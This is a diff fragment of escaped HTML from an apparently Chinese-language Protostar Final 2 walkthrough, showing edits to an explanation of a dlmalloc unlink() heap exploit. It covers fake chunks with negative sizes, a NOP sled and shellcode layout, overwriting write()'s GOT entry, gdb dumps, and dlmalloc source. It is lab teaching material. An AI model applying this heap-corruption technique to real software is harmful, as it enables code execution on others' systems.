+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bk + &lt;span class=&#34;nv&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of func
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第一个堆帧在 gdb 里看起来是这样的：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/40x 0x804e000
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804e000:	0x00000000	0x00000089	0x44525346	0x41414141
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804e010:	0x42424242	0x43434343	0x44444444	0x45454545
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;4142434445 只是一堆随便的字符，先不管它&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;0x804e000: 0x00000000&lt;/code&gt;: prev_size，由于当前堆帧是第一个堆帧，所以是零&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;0x804e004:	0x00000089&lt;/code&gt;: size = 0x89&lt;br&gt;
-0x89 = 0b10001001，这个最后的 1bit 是用于标记前一个堆帧是否已被 free（1 表示正在使用，由于这是第一个堆帧所以这里永远都是 1 的）&lt;br&gt;
-0x89-1 = 0x88 = 136 = 128+8, &lt;br&gt;
-128: REQSZ&lt;br&gt;
-8: prev_size+size = 8&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;0x804e008: 44525346&lt;/code&gt;: 就是开头说过的「必须以 &lt;code&gt;FSRD&lt;/code&gt; 开头，否则 break」&lt;br&gt;
-同时这里也是 buffer 开始的位置 (mem) 和 &lt;code&gt;addr of nop&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;0x804e010: 0x42424242&lt;/code&gt;: 这里相当于就是 &lt;code&gt;addr of nop+0x8&lt;/code&gt;，前文提到过这里会被 &lt;code&gt;unlink()&lt;/code&gt; 写上 &lt;code&gt;addr of write()&lt;/code&gt;&lt;/p&gt;
+同时这里也是 buffer 开始的位置 (mem) 和 &lt;code&gt;addr of shellcode&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;0x804e010: 0x42424242&lt;/code&gt;: 这里相当于就是 &lt;code&gt;addr of shellcode+0x8&lt;/code&gt;，前文提到过这里会被 &lt;code&gt;unlink()&lt;/code&gt; 写上 &lt;code&gt;addr of write()&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;所以 shellcode 实际是从 &lt;code&gt;0x804e014: 0x43434343&lt;/code&gt; 开始&lt;/p&gt;
 &lt;p&gt;即&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/40x 0x804e000                write 指向了这里↓
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804e000: &lt;span class=&#34;m&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00000089&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; F S R D &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NOPNOPNOP
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804e010: NOPNOPNOP&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Shellcode................
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804e000: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;00000000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;00000089&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;F S R D&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;NOPNOPNOP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804e010: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;NOPNOPNOP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Shellcode.......................
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              ↑这里会被写上 &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;addr of write&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
-&lt;h2 id=&#34;fake-chunk&#34;&gt;Fake chunk&lt;/h2&gt;
-&lt;p&gt;别忘了 &lt;code&gt;unlink()&lt;/code&gt; 还有两个前置条件：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;code&gt;size &amp;gt; 0x80&lt;/code&gt;（已满足）&lt;/li&gt;
-&lt;li&gt;前一个堆帧已被 free&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;第二个条件满足的方式在 &lt;a class=&#34;link&#34; href=&#34;/p/protostar_heap_3&#34; &gt;Protostar Heap Three Walkthrough&lt;/a&gt; 有提到过：&lt;/p&gt;
-&lt;p&gt;malloc 标记前一个 chunk 是否被 free 的方法是：看 &lt;code&gt;size&lt;/code&gt; 的最后一个比特是否被设为零，设为零即「前一个 chunk 已被 free」&lt;/p&gt;
-&lt;p&gt;这里有一个很聪明的做法&amp;hellip;可以用负数，比如 &lt;code&gt;0xfffffffc&lt;/code&gt; 即 &lt;code&gt;-4&lt;/code&gt;&lt;/p&gt;
-&lt;br&gt;
-&lt;p&gt;而且这个 &lt;code&gt;0xfffffffc = -4&lt;/code&gt; 能导致两个很有趣的特性：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;不含 null byte&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;malloc 计算下一个 chunk 的位置的方式是：&lt;code&gt;P + size&lt;/code&gt;&lt;br&gt;
-那么 &lt;code&gt;P + (-4)&lt;/code&gt; = &lt;code&gt;P - 4&lt;/code&gt;，就是说下一个 chunk 出现在了当前 chunk 的向前 4 bytes&amp;hellip;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;code&gt;prev_size&lt;/code&gt; 同理&amp;hellip;姑且为了区分就设为 &lt;code&gt;0xfffffff8&lt;/code&gt; 也就是 &lt;code&gt;-8&lt;/code&gt; ，那么上一个 chunk 出现在了当前 chunk 的向后 8 bytes&lt;/p&gt;
-&lt;p&gt;结果就是，我们不需要浪费堆上很多的地址，只要在很小的一段空间里就能伪造出 BK 和 FD&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_final_2/fakechunk.png&#34;
-	width=&#34;1620&#34;
-	height=&#34;888&#34;
-	srcset=&#34;/p/protostar_final_2/fakechunk_hub8aeba815baad8838c1ec99c6231bfb1_182879_480x0_resize_box_3.png 480w, /p/protostar_final_2/fakechunk_hub8aeba815baad8838c1ec99c6231bfb1_182879_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;fakechunk.png&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;182&#34;
-		data-flex-basis=&#34;437px&#34;
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;这里有点点问题&lt;/p&gt;
+&lt;p&gt;毕竟，虽然写上了 NOP，但 0x804e010 处的 addr of write 的地址也确实会被当作一些指令&lt;/p&gt;
+&lt;p&gt;这次运气倒是比较好，因为这个指令翻译过去的话是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# x86 (32), Little Endian&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1cd40408
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Disassembly&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x0000000000000000:  1C D4    sbb al, 0xd4
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x0000000000000002:  &lt;span class=&#34;m&#34;&gt;04&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt;    add al, &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看起来还算正常，并不会导致 Segmentation Fault&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;expection&#34;&gt;Expection&lt;/h2&gt;
 &lt;p&gt;结合前面提到过的，本题关键在于，程序的预期是 &lt;code&gt;ROOT&lt;/code&gt; 出现在 &lt;code&gt;/&lt;/code&gt; 后面&lt;/p&gt;
@@ -1022,11 +968,7 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;====&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;====&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;====&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;====&lt;/span&gt;                               
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            -8&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  -4&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  fd&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  bk
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;implement&#34;&gt;Implement&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:~$ objdump -R /opt/protostar/bin/final2 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep write
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804d41c R_386_JUMP_SLOT   write
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804d468 R_386_JUMP_SLOT   fwrite
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:~$
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最终的思路画成图：&lt;/p&gt;
+&lt;p&gt;最终的思路画成图：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;/p/protostar_final_2/buf.png&#34;
 	width=&#34;1864&#34;
 	height=&#34;1082&#34;
@@ -1121,119 +1063,8 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
     &gt;old malloc implementations&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://conceptofproof.wordpress.com/2013/11/19/protostar-heap3-walkthrough/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Protostar Heap3 Walkthrough | conceptofproof&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://airman604.medium.com/protostar-heap-3-walkthrough-56d9334bcd13&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;Protostar Heap 3 Walkthrough | Airman&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://youtu.be/HWhzH--89UQ&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;The Heap: dlmalloc unlink() exploit - bin 0x18&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;其实起笔的时候还并不是特别理解&lt;/p&gt;
-&lt;p&gt;但是因为思路很乱有点理不清了，所以姑且把已经理解的部分记下来&lt;/p&gt;
-&lt;p&gt;然后写着写着就清楚多了x&lt;/p&gt;
-&lt;hr&gt;
-&lt;h2 id=&#34;dlmalloc-basics-32-bit-x86-architecture&#34;&gt;Dlmalloc Basics (32-bit x86 architecture)&lt;/h2&gt;
-&lt;p&gt;使用中的 chunk：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;prev_size&lt;/code&gt;: 4 bytes 用于标注前一个 chunk 的大小&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;size&lt;/code&gt;: 4 bytes 用于标注当前 chunk 的大小，且最后两&lt;strong&gt;比特&lt;/strong&gt;用于标记：
-&lt;ol&gt;
-&lt;li&gt;倒数第一位用于标记前一个 chunk 是否被使用&lt;/li&gt;
-&lt;li&gt;倒数第二位用于标记当前 chunk 是否已通过 mmap 分配&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;strong&gt;NAME&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;mmap, munmap - map or unmap files or devices into memory&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;SYNOPSIS&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;#include &amp;lt;sys/mman.h&amp;gt;
-void *mmap(void *addr, size_t length, int prot, int flags,
-int fd, off_t offset);
-int munmap(void *addr, size_t length);&lt;/p&gt;
-&lt;p&gt;See NOTES for information on feature test macro requirements.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;DESCRIPTION&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;mmap() creates a new mapping in the virtual address space of the
-calling process.  The starting address for the new mapping is
-specified in addr.  The length argument specifies the length of
-the mapping (which must be greater than 0).&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    chunk -&amp;gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-             | prev_size: size of the previous chunk, in bytes (used   |
-             | by dlmalloc only if this previous chunk is free)        |
-             +---------------------------------------------------------+
-             | size: size of the chunk (the number of bytes between    |
-             | &amp;#34;chunk&amp;#34; and &amp;#34;nextchunk&amp;#34;) and 2 bits status information  |
-      mem -&amp;gt; +---------------------------------------------------------+
-             | fd: not used by dlmalloc because &amp;#34;chunk&amp;#34; is allocated   |
-             | (user data therefore starts here)                       |
-             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
-             | bk: not used by dlmalloc because &amp;#34;chunk&amp;#34; is allocated   |
-             | (there may be user data here)                           |
-             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
-             |                                                         .
-             .                                                         .
-             . user data (may be 0 bytes long)                         .
-             .                                                         .
-             .                                                         |
-nextchunk -&amp;gt; + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
-             | prev_size: not used by dlmalloc because &amp;#34;chunk&amp;#34; is      |
-             | allocated (may hold user data, to decrease wastage)     |
-             +---------------------------------------------------------+
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;已 free 的 chunk：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;fd&lt;/code&gt;: 4 bytes 指向双向链表的前一个 chunk&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;bk&lt;/code&gt;: 4 bytes 指向双向链表的后一个 chunk&lt;/li&gt;
-&lt;/ul&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    chunk -&amp;gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-             | prev_size: may hold user data (indeed, since &amp;#34;chunk&amp;#34; is |
-             | free, the previous chunk is necessarily allocated)      |
-             +---------------------------------------------------------+
-             | size: size of the chunk (the number of bytes between    |
-             | &amp;#34;chunk&amp;#34; and &amp;#34;nextchunk&amp;#34;) and 2 bits status information  |
-      mem -&amp;gt; +---------------------------------------------------------+
-             | fd: forward pointer to the next chunk in the circular   |
-             | doubly-linked list (not to the next _physical_ chunk)   |
-             +---------------------------------------------------------+
-             | bk: back pointer to the previous chunk in the circular  |
-             | doubly-linked list (not the previous _physical_ chunk)  |
-             +---------------------------------------------------------+
-             |                                                         .
-             .                                                         .
-             . unused space (may be 0 bytes long)                      .
-             .                                                         .
-             .                                                         |
-nextchunk -&amp;gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-             | prev_size: size of &amp;#34;chunk&amp;#34;, in bytes (used by dlmalloc  |
-             | because this previous chunk is free)                    |
-             +---------------------------------------------------------+
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;重点&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;如果一个 chunk 即将被 free，那么：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;如果这个 chunk &lt;strong&gt;是&lt;/strong&gt;通过 mmap 分配的，那么调用 &lt;code&gt;munmap_chunk()&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;如果这个 chunk &lt;strong&gt;不是&lt;/strong&gt;通过 mmap 分配的，那么调用 &lt;code&gt;chunk_free()&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;INTERNAL_SIZE_T&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PREV_INUSE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;     &lt;span class=&#34;cm&#34;&gt;/* consolidate backward */&lt;/span&gt;    &lt;span class=&#34;cm&#34;&gt;/* [A] */&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;prevsz&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prev_size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chunk_at_offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prevsz&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                 &lt;span class=&#34;cm&#34;&gt;/* [B] */&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;sz&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prevsz&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;last_remainder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ar_ptr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;islr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bck&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 &lt;code&gt;chunk_free()&lt;/code&gt; 函数中，有另一个需要注意的函数：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;如果前一个 chunk 也被 free 了的话，那么会调用  &lt;code&gt;unlink()&lt;/code&gt;， 以确保双向链表的准确链接：&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define unlink( P, BK, FD ) {           
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;		&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;           
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;		\
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;	&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;                
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;	&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;                       
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
